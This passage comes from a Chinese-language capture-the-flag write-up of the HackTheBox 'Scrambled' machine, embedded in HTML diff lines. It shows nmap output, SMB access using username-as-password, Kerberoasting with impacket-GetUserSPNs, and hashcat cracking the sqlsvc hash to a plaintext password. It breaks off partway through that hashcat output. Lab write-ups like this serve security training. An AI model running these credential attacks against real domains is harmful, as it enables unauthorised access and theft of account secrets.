class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(GenericLines,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;S</span><br><span class="hljs-string">SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(GetRequest,<span class="hljs-number">35</span>,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS</span><br><span class="hljs-string">SF:_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(HTTPOptions,<span class="hljs-number">35</span>,<span class="hljs-string">&quot;SCRAMBLECO</span><br><span class="hljs-string">SF:RP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(RTSPRequest,<span class="hljs-number">35</span>,<span class="hljs-string">&quot;S</span><br><span class="hljs-string">SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(RPCCheck<br>SF:,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(DNSVersionBindReqTCP,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCR</span><br><span class="hljs-string">SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(DNSStatusRequestTCP,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP</span><br><span class="hljs-string">SF:_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(Help,<span class="hljs-number">35</span>,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERR</span><br><span class="hljs-string">SF:OR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r(SSLSessionReq,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0</span><br><span class="hljs-string">SF:\.3;\r\n&quot;</span>)%r(TerminalServerCookie,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n</span><br><span class="hljs-string">SF:&quot;</span>)%r(TLSSessionReq,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(Kerberos,<span class="hljs-number">1</span><br>SF:D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(SMBProgNeg,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_OR</span><br><span class="hljs-string">SF:DERS_V1\.0\.3;\r\n&quot;</span>)%r(X11Probe,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)<br>SF:%r(FourOhFourRequest,<span class="hljs-number">35</span>,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN</span><br><span class="hljs-string">SF:_COMMAND;\r\n&quot;</span>)%r(LPDString,<span class="hljs-number">35</span>,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_</span><br><span class="hljs-string">SF:UNKNOWN_COMMAND;\r\n&quot;</span>)%r(LDAPSearchReq,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3</span><br><span class="hljs-string">SF:;\r\n&quot;</span>)%r(LDAPBindReq,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(SIPOpti<br>SF:ons,<span class="hljs-number">35</span>,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span>)%r<br>SF:(LANDesk-RC,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(TerminalServer,<span class="hljs-number">1</span>D<br>SF:,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(NCP,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\</span><br><span class="hljs-string">SF:.0\.3;\r\n&quot;</span>)%r(NotesRPC,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(JavaR<br>SF:MI,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(WMSRequest,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECOR</span><br><span class="hljs-string">SF:P_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(oracle-tns,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;</span><br><span class="hljs-string">SF:\r\n&quot;</span>)%r(ms-sql-s,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(afp,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCR</span><br><span class="hljs-string">SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>)%r(giop,<span class="hljs-number">1</span>D,<span class="hljs-string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.</span><br><span class="hljs-string">SF:3;\r\n&quot;</span>);<br>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T14:<span class="hljs-number">15</span>:<span class="hljs-number">47</span><br>|_  start_date: N/A<br>|_clock-skew: mean: <span class="hljs-number">-8</span>h02m54s, deviation: <span class="hljs-number">1</span>s, median: <span class="hljs-number">-8</span>h02m54s<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">202.76</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>4、将端口扫描发现的地址，绑定到本地hosts中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.168 DC1.scrm.local scrm.local&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span> DC1.scrm.local scrm.local<br></code></pre></td></tr></table></figure>
+
+<p>5、查看下80端口的服务内容吧</p>
+<p><code>http://10.10.11.168/index.html</code></p>
+<p><img src="http://sh1yan.top/photo/Scrambled-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.11.168/support.html</code></p>
+<p><img src="http://sh1yan.top/photo/Scrambled-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">2021</span>年<span class="hljs-number">9</span>月<span class="hljs-number">4</span>日：由于上个月的安全漏洞，我们现在已经禁用了网络上的所有NTLM身份验证。这可能会导致问题的一些程序您使用，所以请耐心等待，而我们的工作，以解决任何问题 <br></code></pre></td></tr></table></figure>
+
+<p>6、参照上面的提示，看来该系统是禁用了NTLM的身份认证，也就是，只能通过域名的形式的域认证了，基于域内IP地址的认证是不行了，那继续看下一个地址</p>
+<p><code>http://10.10.11.168/supportrequest.html</code></p>
+<p><img src="http://sh1yan.top/photo/Scrambled-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>请将您的电子邮件发送至support@scramblecorp.com，我们将尽快回复您。</code> </p>
+<p>7、其实基于上面的这也截图中，我们也是发现了一个用户的IP的</p>
+<p><code>ksimpson</code></p>
+<p><img src="http://sh1yan.top/photo/Scrambled-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、这里我想到的是Asreproasting 攻击漏洞，但是尝试失败了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-GetNPUsers -dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span> scrm.local/ksimpson -no-pass  <br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Getting TGT <span class="hljs-keyword">for</span> ksimpson<br>[-] User ksimpson doesn<span class="hljs-number">&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure>
+
+<p>9、那继续查看网站信息，挖掘信息吧</p>
+<p><code>http://10.10.11.168/passwords.html</code></p>
+<p><img src="http://sh1yan.top/photo/Scrambled-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">我们的自助密码重置系统将很快启动并运行，但在此期间，请致电IT支持热线，我们将重置您的密码。如果没有人可用，请留言说明您的用户名，我们将重置您的密码与用户名相同。 <br></code></pre></td></tr></table></figure>
+
+<p><code>http://10.10.11.168/salesorders.html</code></p>
+<p><img src="http://sh1yan.top/photo/Scrambled-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、在这里看上面的提示，是否意味着用户名就是密码呢？我们使用SMBclient工具尝试下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-smbclient -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span><br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[-] CCache file is not found. Skipping...<br>Type help <span class="hljs-keyword">for</span> <span class="hljs-built_in">list</span> of commands<br><span class="hljs-meta"># share</span><br>*** Unknown syntax: share<br><span class="hljs-meta"># shares</span><br>ADMIN$<br>C$<br>HR<br>IPC$<br>IT<br>NETLOGON<br>Public<br>Sales<br>SYSVOL<br><span class="hljs-meta"># use Public</span><br><span class="hljs-meta"># ls</span><br>drw-rw-rw-          <span class="hljs-number">0</span>  Fri Nov  <span class="hljs-number">5</span> <span class="hljs-number">06</span>:<span class="hljs-number">23</span>:<span class="hljs-number">19</span> <span class="hljs-number">2021</span> .<br>drw-rw-rw-          <span class="hljs-number">0</span>  Fri Nov  <span class="hljs-number">5</span> <span class="hljs-number">06</span>:<span class="hljs-number">23</span>:<span class="hljs-number">19</span> <span class="hljs-number">2021</span> ..<br>-rw-rw-rw-     <span class="hljs-number">630106</span>  Sat Nov  <span class="hljs-number">6</span> <span class="hljs-number">01</span>:<span class="hljs-number">45</span>:<span class="hljs-number">07</span> <span class="hljs-number">2021</span> Network Security Changes.pdf<br><span class="hljs-meta"># get <span class="hljs-string">&#x27;Network Security Changes.pdf&#x27;</span></span><br>[-] SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)<br><span class="hljs-meta"># get Network Security Changes.pdf</span><br># <br></code></pre></td></tr></table></figure>
+
+<p>11、这里下载了一个PDF文件，查看下这个文件吧</p>
+<p><code>file:///home/kali/Desktop/Network%20Security%20Changes.pdf</code></p>
+<p><img src="http://sh1yan.top/photo/Scrambled-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">正如您可能已经听说的，我们的网络最近被入侵，攻击者能够访问我们的所有数据。我们已经确定了攻击者能够获得访问权限的方式，并立即进行了一些更改。您可以找到下面列出的这些以及这些更改可能影响您的方式。<br>变更:由于攻击者使用了所谓的“NTLM中继”，我们已经在整个网络中禁用了NTLM身份验证。<br>受影响用户:所有<br>解决办法:当您登录或访问网络资源时，现在将使用Kerberos身份验证(这绝对是<span class="hljs-number">100</span>%安全的，绝对没有任何人可以利用它)。这将需要您使用完整的域名(scrm.local)与您的用户名和您访问的任何服务器名称。<br>变更:攻击者能够从我们的人力资源软件使用的SQL数据库中检索凭据，因此我们删除了除网络管理员以外的所有人对SOL服务的所有访问权限。<br>受影响的用户:人力资源部门<br>解决办法:如果您无法再访问HR软件，请联系我们，我们将手动重新授予您的帐户访问权限。<br></code></pre></td></tr></table></figure>
+
+<p>12、看到这里，我又想到，既然我们有了域内的账号密码，那是否可以kerberosRoast攻击</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host <span class="hljs-string">&#x27;dc1.scrm.local&#x27;</span> -request<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[-] CCache file is not found. Skipping...<br>[-] CCache file is not found. Skipping...<br>ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation <br>----------------------------  ------  --------  --------------------------  --------------------------  ----------<br>MSSQLSvc/dc1.scrm.local:<span class="hljs-number">1433</span>  sqlsvc            <span class="hljs-number">2021</span><span class="hljs-number">-11</span><span class="hljs-number">-04</span> <span class="hljs-number">00</span>:<span class="hljs-number">32</span>:<span class="hljs-number">02.351452</span>  <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span> <span class="hljs-number">22</span>:<span class="hljs-number">09</span>:<span class="hljs-number">41.785250</span>             <br>MSSQLSvc/dc1.scrm.local       sqlsvc            <span class="hljs-number">2021</span><span class="hljs-number">-11</span><span class="hljs-number">-04</span> <span class="hljs-number">00</span>:<span class="hljs-number">32</span>:<span class="hljs-number">02.351452</span>  <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span> <span class="hljs-number">22</span>:<span class="hljs-number">09</span>:<span class="hljs-number">41.785250</span>             <br><br><br><br>[-] CCache file is not found. Skipping...<br>$krb5tgs$<span class="hljs-number">23</span>$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$<span class="hljs-number">3</span>d7b8500d43ce6a2016a85c70a244e93$<span class="hljs-number">4</span>d7c0b0789f88ca5c5ee876f66b3d55bc7dabe1f7fa515bed48cb126310338ed8be9a88b82491700bf8ff6bf712f102765d764647b837e6df52634026190e8b01e3e85f1ccf061cbb01c8c4e7d0d8c2f9f66599f0b8a5b1053fb4829649afdb4fa350c77aca8883fcad4724f3fa4ab81e691785033909e6c801eb6e89085f082d5b58a00da0e616508a0e8d5ae8c9c2a70f627d5022259c2657dbef235005d35af39de038e243dc7592e02129b0bb5a9c4e00cdbe7a544432c6e3b4412490dd7c369b95463298d9c4a285534b330c2b3ed97c1900919ee15211abdf393dfe711d2e17c55f9d3a1440f925d2767ae018eab09fc3a5868f6f0e3961e842b0c936f63952420093a6159f7d9615e9bbb7c9c7e0ecbe0965a57566dd8f8b8b3c9072e82349a06c454173023b40e97da0a8c7a0028d74f04da39718315c8926d5d3a6b811fbff722535a4371bbee41fde92fb1c6de56cef80f564271de391b83b74e40bddea0df139dda098c33b06a61eecc30d4dc63ce646063a808d66518a3de0b48aa32226421f10c9f3b40f39d351aca6d7c2e3ba44ab06c481bd5d7c0daf938ebb9021f680f5cca3d4ea3bf7863fb2826c34478ad2b61ea06ad20b0d41bfb2e8704f7f4f096682ff81eade3946713aa7efb5bb4ee10c7c32260273cc303fe2762b0184e7700397429a3d31306ae0e0ae41cba0b4ba7f71d4709c76c201ca834907715b0d8f3ab912f0b1d07fefb855a813e8dcfcd1a1cc0acd202bde5870b3a6ec1a00eba72751b303e98d69b3b16ea9ef5d10360dee607929638354ad6f55629e1fdb0c2b8cbe25f6593167394cba07dc74908ff0d2f97440c9ddbf37b1b268564902565ababda7c744930823c2d9a1a5c160c0780ac576dbb1a1255b7e0d23c8bcf2a79a14c079a500c2189383869eabc0949655794cacfcf8883dc85b0f7f1d6151ac87992baad4d385fbfbe354ede517aad09c47ac6fdbfce58b956431ea1c05b9746f3d9fd5b350eec783f674b6efc353630b97d8a5163ac585d6a6e9db5b54d21ecfce69001d73311b93053517f9138f677de38622b6a7f66c872fa6f13b50642de58d42c389513c45400d30eaebfaba10c5e08671a27d0a3c9f90b605878123aeff86cc2b54ca69e5a1d62d781c9114cc05882ba1e500af7b8cdc5ad3a4b9fcae541d8d07972175efd4b6976afe803b50f946bf0390ec27b949fb9f1efa0b5b7eb1002b2f61a38c799bf6cd699059363ccd5418a61b822891795802b6784cb74019c0ef2a29c675a31ab83980fbeec832134c645d513dbc16745503b18d937f4f61336bb593157588620b360ad02bf731fee1a55deaa518d11012b7f6553ede19dad9e5deca07b7232bedc10073157fedad4a2a24d72b570177b87fe14db77fec67156f05682dc381d1457db2d4c7d39fecbe7e532fad3ff<br></code></pre></td></tr></table></figure>
+
+<p>13、尝试破解下密码吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ hashcat -h | grep -i <span class="hljs-string">&quot;kerberos&quot;</span><br>  <span class="hljs-number">19600</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">19800</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, Pre-Auth                             | Network Protocol<br>  <span class="hljs-number">28800</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, DB                                   | Network Protocol<br>  <span class="hljs-number">19700</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">19900</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, Pre-Auth                             | Network Protocol<br>  <span class="hljs-number">28900</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, DB                                   | Network Protocol<br>   <span class="hljs-number">7500</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS-REQ Pre-Auth                      | Network Protocol<br>  <span class="hljs-number">13100</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">18200</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS-REP                               | Network Protocol<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo hashcat -m <span class="hljs-number">13100</span> hash /usr/share/wordlists/rockyou.txt                     <br>[sudo] kali 的密码：<br>hashcat (v6<span class="hljs-number">.2</span><span class="hljs-number">.6</span>) starting<br><br>OpenCL <span class="hljs-title function_">API</span> <span class="hljs-params">(OpenCL <span class="hljs-number">3.0</span> PoCL <span class="hljs-number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="hljs-number">15.0</span><span class="hljs-number">.7</span>, SLEEF, POCL_DEBUG)</span> - Platform #1 [The pocl project]<br>==========================================================================================================================================<br>* Device #<span class="hljs-number">1</span>: cpu-<span class="hljs-number">-0x000</span>, <span class="hljs-number">1439</span>/<span class="hljs-number">2942</span> MB (<span class="hljs-number">512</span> MB allocatable), <span class="hljs-number">4</span>MCU<br><br>Minimum password length supported by kernel: <span class="hljs-number">0</span><br>Maximum password length supported by kernel: <span class="hljs-number">256</span><br><br>Hashes: <span class="hljs-number">1</span> digests; <span class="hljs-number">1</span> unique digests, <span class="hljs-number">1</span> unique salts<br>Bitmaps: <span class="hljs-number">16</span> bits, <span class="hljs-number">65536</span> entries, <span class="hljs-number">0x0000ffff</span> mask, <span class="hljs-number">262144</span> bytes, <span class="hljs-number">5</span>/<span class="hljs-number">13</span> rotates<br>Rules: <span class="hljs-number">1</span><br><br>Optimizers applied:<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to <span class="hljs-keyword">switch</span> to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature <span class="hljs-built_in">abort</span> trigger <span class="hljs-built_in">set</span> to <span class="hljs-number">90</span>c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: <span class="hljs-number">0</span> MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: <span class="hljs-number">14344385</span><br>* Bytes.....: <span class="hljs-number">139921507</span><br>* Keyspace..: <span class="hljs-number">14344385</span><br><br>Cracking performance lower than expected?                 <br><br>* Append -O to the commandline.<br>  This lowers the maximum supported password/salt <span class="hljs-title function_">length</span> <span class="hljs-params">(usually down to <span class="hljs-number">32</span>)</span>.<br><br>* Append -w 3 to the commandline.<br>  This can cause your screen to lag.<br><br>* Append -S to the commandline.<br>  This has a drastic speed impact but can be better <span class="hljs-keyword">for</span> specific attacks.<br>  Typical scenarios are a small wordlist but a large ruleset.<br><br>* Update your backend API runtime / driver the right way:<br>  https:<span class="hljs-comment">//hashcat.net/faq/wrongdriver</span><br><br>* Create more work items to make use of your parallelization power:<br>  https:<span class="hljs-comment">//hashcat.net/faq/morework</span><br><br>$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$3d7b8500d43ce6a2016a85c70a244e93$4d7c0b0789f88ca5c5ee876f66b3d55bc7dabe1f7fa515bed48cb126310338ed8be9a88b82491700bf8ff6bf712f102765d764647b837e6df52634026190e8b01e3e85f1ccf061cbb01c8c4e7d0d8c2f9f66599f0b8a5b1053fb4829649afdb4fa350c77aca8883fcad4724f3fa4ab81e691785033909e6c801eb6e89085f082d5b58a00da0e616508a0e8d5ae8c9c2a70f627d5022259c2657dbef235005d35af39de038e243dc7592e02129b0bb5a9c4e00cdbe7a544432c6e3b4412490dd7c369b95463298d9c4a285534b330c2b3ed97c1900919ee15211abdf393dfe711d2e17c55f9d3a1440f925d2767ae018eab09fc3a5868f6f0e3961e842b0c936f63952420093a6159f7d9615e9bbb7c9c7e0ecbe0965a57566dd8f8b8b3c9072e82349a06c454173023b40e97da0a8c7a0028d74f04da39718315c8926d5d3a6b811fbff722535a4371bbee41fde92fb1c6de56cef80f564271de391b83b74e40bddea0df139dda098c33b06a61eecc30d4dc63ce646063a808d66518a3de0b48aa32226421f10c9f3b40f39d351aca6d7c2e3ba44ab06c481bd5d7c0daf938ebb9021f680f5cca3d4ea3bf7863fb2826c34478ad2b61ea06ad20b0d41bfb2e8704f7f4f096682ff81eade3946713aa7efb5bb4ee10c7c32260273cc303fe2762b0184e7700397429a3d31306ae0e0ae41cba0b4ba7f71d4709c76c201ca834907715b0d8f3ab912f0b1d07fefb855a813e8dcfcd1a1cc0acd202bde5870b3a6ec1a00eba72751b303e98d69b3b16ea9ef5d10360dee607929638354ad6f55629e1fdb0c2b8cbe25f6593167394cba07dc74908ff0d2f97440c9ddbf37b1b268564902565ababda7c744930823c2d9a1a5c160c0780ac576dbb1a1255b7e0d23c8bcf2a79a14c079a500c2189383869eabc0949655794cacfcf8883dc85b0f7f1d6151ac87992baad4d385fbfbe354ede517aad09c47ac6fdbfce58b956431ea1c05b9746f3d9fd5b350eec783f674b6efc353630b97d8a5163ac585d6a6e9db5b54d21ecfce69001d73311b93053517f9138f677de38622b6a7f66c872fa6f13b50642de58d42c389513c45400d30eaebfaba10c5e08671a27d0a3c9f90b605878123aeff86cc2b54ca69e5a1d62d781c9114cc05882ba1e500af7b8cdc5ad3a4b9fcae541d8d07972175efd4b6976afe803b50f946bf0390ec27b949fb9f1efa0b5b7eb1002b2f61a38c799bf6cd699059363ccd5418a61b822891795802b6784cb74019c0ef2a29c675a31ab83980fbeec832134c645d513dbc16745503b18d937f4f61336bb593157588620b360ad02bf731fee1a55deaa518d11012b7f6553ede19dad9e5deca07b7232bedc10073157fedad4a2a24d72b570177b87fe14db77fec67156f05682dc381d1457db2d4c7d39fecbe7e532fad3ff:Pegasus60<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 13100 <span class="hljs-params">(Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, TGS-REP)</span><br>Hash.Target......: $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$3...fad3ff<br>Time.Started.....: Sun Apr  7 23:40:25 2024 <span class="hljs-params">(<span class="hljs-number">7</span> secs)</span><br>Time.Estimated...: Sun Apr  7 23:40:32 2024 <span class="hljs-params">(<span class="hljs-number">0</span> secs)</span><br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: <span class="hljs-title function_">File</span> <span class="hljs-params">(/usr/share/wordlists/rockyou.txt)</span><br>Guess.Queue......: 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span><br>Speed.#1.........:  1699.4 kH/<span class="hljs-title function_">s</span> <span class="hljs-params">(<span class="hljs-number">0.45</span>ms)</span> @ Accel:256 Loops:1 Thr:1 Vec:4<br>Recovered........: 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span> <span class="hljs-title function_">Digests</span> <span class="hljs-params">(total)</span>, 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span> <span class="hljs-title function_">Digests</span> <span class="hljs-params">(new)</span><br>Progress.........: 10729472/14344385 <span class="hljs-params">(<span class="hljs-number">74.80</span>%)</span><br>Rejected.........: 0/10729472 <span class="hljs-params">(<span class="hljs-number">0.00</span>%)</span><br>Restore.Point....: 10728448/14344385 <span class="hljs-params">(<span class="hljs-number">74.79</span>%)</span><br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 